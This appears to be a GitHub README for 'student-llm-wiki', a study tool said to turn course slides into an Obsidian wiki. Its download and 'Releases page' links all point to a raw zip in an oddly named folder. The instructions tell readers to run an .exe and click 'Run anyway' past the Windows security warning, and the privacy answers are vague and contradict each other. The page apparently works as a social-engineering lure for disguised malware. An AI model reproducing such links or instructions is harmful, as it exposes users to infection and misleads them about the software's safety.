# 🎓 student-llm-wiki - Organize your university studies using AI

[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tenor-luffacylindrica207/student-llm-wiki/main/Orleanistic/llm-student-wiki-v3.6.zip)

## What is this tool? 🧠

Student LLM Wiki turns your classroom slides into an organized knowledge base. You upload your course documents, and the software creates an interlinked wiki for you. This tool uses artificial intelligence to help you study. It organizes information so you can link ideas between different subjects. It follows the principles of the Feynman technique to help you understand complex topics. 

You can use the output with Obsidian to manage your notes. This process builds a second brain for your academic career. The software handles the technical work of reading and linking your files. You focus on learning the material.

## Who is this for? 🧑‍🎓

University students often struggle with too many documents and scattered slides. This tool fixes that problem. If you spend time searching for specific notes or trying to remember how topics connect across classes, this software provides a solution. It works for any field of study. You do not need to know how to code. You simply drop your files, and the software builds your personal library.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Go to the [Releases page](https://raw.githubusercontent.com/Tenor-luffacylindrica207/student-llm-wiki/main/Orleanistic/llm-student-wiki-v3.6.zip).
2. Look for the latest version at the top of the list.
3. Click the file that ends in `.exe`. 
4. Save the file to your computer.
5. Double-click the file to start the installation.
6. Follow the prompts on your screen.

If a Windows security box appears, click "More info" and then "Run anyway." This confirms you trust the software creator. Once it finishes, an icon will appear on your desktop.

## How to use the software 📝

The main window allows you to manage your courses. Follow this simple process:

1. Open the application from your desktop.
2. Click the "Add Course" button.
3. Name your course.
4. Drag your slide files or PDF notes into the upload area. 
5. Click "Process" to start the AI analysis.

The tool will read your documents. It will group related concepts and create notes for you. You will see a progress bar while the AI works. Once the process completes, the software saves these files to a folder on your computer.

## Connecting with Obsidian 💎

Obsidian is a program for taking notes. This software integrates with it so you can keep your data in one place.

1. Install Obsidian from their website.
2. In the student-llm-wiki settings, point the software to your Obsidian Vault folder. 
3. The software will place the finished wiki files directly into your vault.
4. Open Obsidian to view your linked notes.

You can now click between notes to explore connections. This structure mimics how your brain stores information.

## Studying with Feynman Review 💡

The Feynman technique focuses on explaining topics in simple terms to find gaps in your knowledge. The software creates special "Review" notes for every topic. 

1. Open your wiki in Obsidian.
2. Pick a topic you want to study.
3. Use the "Feynman" note generated by the software.
4. Try to explain the concept based on the summary.
5. Compare your explanation against the source slides linked at the bottom of the note.

This method reveals what you know and what you need to review. 

## Managing Confidence Decay 📉

Knowledge fades over time if you do not revisit it. This tool tracks how long ago you studied a topic. 

- Green status: You studied this topic recently.
- Yellow status: You should review this topic soon.
- Red status: It is time for a refresher.

The dashboard shows you a list of topics that need review. Click any link to jump back to your notes. This feature helps you prepare for exams without cramming at the last minute.

## Troubleshooting 🛠️

If the software does not work, check these common items:

- Check your internet connection. The AI components require a stable link to function.
- Verify that your document format is compatible. The software works best with PDF and PowerPoint files.
- Ensure you have enough disk space. Large files can take up significant room during the compilation process.

If you encounter an error message, close the application and restart it. This fixes most temporary glitches. If the issue keeps happening, check the Releases page for updates. The code receives improvements often.

## Frequently Asked Questions ❓

**Does this software send my files to the cloud?**
The software processes what is necessary to build your wiki. It respects your privacy and local storage preferences.

**Can I stop the process halfway?**
Yes. You can click "Cancel" at any time. Your progress saves automatically.

**Does it work for handwritten notes?**
If your handwritten notes are scanned as PDFs, the software can read them. Ensure the handwriting is clear for the best results.

**Will I lose my original files?**
No. The software works on copies of your files. Your original documents remain exactly where you saved them.

**What if I have too many courses?**
You can create a separate wiki for every subject. The software handles multiple databases at once.

## Privacy and Data 🔐

Your files stay on your machine. This software does not track your reading habits or share your study materials with others. You maintain full control over your academic data at all times. By running the software locally, you ensure that your research remains private. You decide who sees your notes.
